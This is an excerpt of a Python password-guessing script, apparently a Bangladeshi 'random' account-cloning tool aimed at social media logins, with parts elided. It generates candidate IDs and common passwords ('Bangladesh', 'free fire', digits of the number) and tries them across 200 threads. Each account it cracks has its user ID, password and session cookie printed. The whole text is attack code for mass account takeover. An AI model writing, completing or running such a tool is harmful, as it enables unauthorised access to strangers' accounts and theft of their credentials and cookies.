...
\033[1;92m➣ \033[1;92mTOOLS      :            BD REANDOM
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""
loop = 0
oks = []
...
def mahdi():
    ...
    for bilal in range(passx):
        ...
        HamiiID.append(pww)
    with ThreadPool(max_workers=200) as manshera:
        clear()
        tl = str(len(user))
        ...
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[2:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MAHDI-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
